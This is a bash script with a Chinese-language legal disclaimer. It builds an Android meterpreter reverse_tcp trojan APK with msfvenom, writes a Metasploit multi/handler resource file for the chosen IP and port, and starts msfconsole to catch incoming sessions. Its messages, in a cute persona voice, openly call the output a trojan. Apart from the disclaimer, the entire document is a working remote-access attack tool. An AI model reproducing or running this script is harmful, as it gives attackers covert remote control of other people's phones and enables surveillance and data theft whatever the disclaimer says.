#!/bin/bash
# ============================================================================
# @author 钟智强
# @email johnmelodymel@qq.com
#
# ============================================================================
# == 重要声明 ==
# ============================================================================
# 本程序仅供学习和技术研究使用，禁止将其用于任何未获授权的侵入、
# 攻击、监听、干扰或其他违反网络安全和隐私保护的行为。
#
# 使用者必须在**完全理解并同意上述条款**的前提下使用本程序。
# 任何将本程序用于**非法目的**的行为，其**所有后果**（包括但不限于
# 行政处罚、民事赔偿、刑事责任）**均由使用者自行承担**。
#
# 请务必遵守您所在国家和地区的相关法律法规，特别是以下中国法律条款：
#
# - 《中华人民共和国网络安全法》 第十二条：任何个人和组织不得利用网络
#   从事危害国家安全、荣誉和利益，煽动颠覆国家政权等违法犯罪活动。
# - 《中华人民共和国刑法》 第二百八十五条至第二百八十七条：
#   非法侵入计算机信息系统、破坏系统功能或数据的行为将被追究刑事责任。
# - 《中华人民共和国数据安全法》 第三条、第十七条：
#   从事数据处理活动应当依法保障数据安全，禁止非法获取、泄露数据。
#
# 💡特别提醒：本程序设计中可能涉及网络通信、数据收集、远程控制等功能，
# 均应在**授权范围内**使用，任何对设备、系统、数据的未经授权的访问或控制
# 都属于违法行为。
#
# 📛 违反以上条款造成的一切法律后果与责任，与作者无关。
#
# ============================================================================

# 🛡️ 检查 Metasploit 是否安装
if ! command -v msfvenom >/dev/null 2>&1 || ! command -v msfconsole >/dev/null 2>&1; then
    echo -e "\033[1;31m[错误]💥 灵儿检测到你没有安装 Metasploit Framework！\033[0m"
    echo -e "\033[1;33m[提示]👉 请先安装 Metasploit，或者检查 PATH 设置。\033[0m"
    echo -e "\033[1;36m安装命令推荐：\033[0m \033[1;32msudo apt install metasploit-framework\033[0m"
    exit 1
fi

# 获取本地内网IP作为默认监听IP，萌萌哒灵儿帮你拿了~ 🌸
default_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -vE '127.0.0.1|::1' | awk '{print $2}' | head -n1)

# 小函数：彩色提示，灵儿帮你美美哒提示
function print_prompt() {
    echo "\033[1;35m[0xLing] 💡 灵儿提示：请输入 \033[1;33m$1\033[0m （$2）："
}

# 询问监听IP，默认是本机IP
print_prompt "监听IP" "默认 $default_ip"
read ip_addr
ip_addr=${ip_addr:-$default_ip}

# 询问监听端口，默认4444
print_prompt "监听端口" "默认 4444"
read port
port=${port:-4444}

filename="ling_shell"

echo "\033[1;35m[0xLing] 💖 灵儿提示：正在萌萌哒生成木马 APK，请稍等哦~ 💫...\033[0m"
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip_addr" LPORT="$port" -o "${filename}.apk"
if [[ $? -ne 0 ]]; then
    echo "\033[1;31m[失败] (╥﹏╥) 哎呀，木马 APK 生成失败了，灵儿好伤心，脚本退出啦~ \033[0m"
    exit 1
fi

echo "\033[1;32m[成功] (づ｡◕‿‿◕｡)づ 木马 APK 生成完毕啦，快接收我的爱心：${filename}.apk 💖\033[0m"

cat >"${filename}.rc" <<EOF
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $ip_addr
set LPORT $port
set ExitOnSession false
exploit -j
EOF

echo "\033[1;32m[成功] (＾▽＾) 脚本生成完成！文件名是：${filename}.rc ✨"
echo "\033[1;35m[0xLing] 🌸 灵儿温馨提示：马上启动监听器(msfconsole)，接收爱的小尾巴~ 💕\033[0m"

sudo msfconsole -r "${filename}.rc"
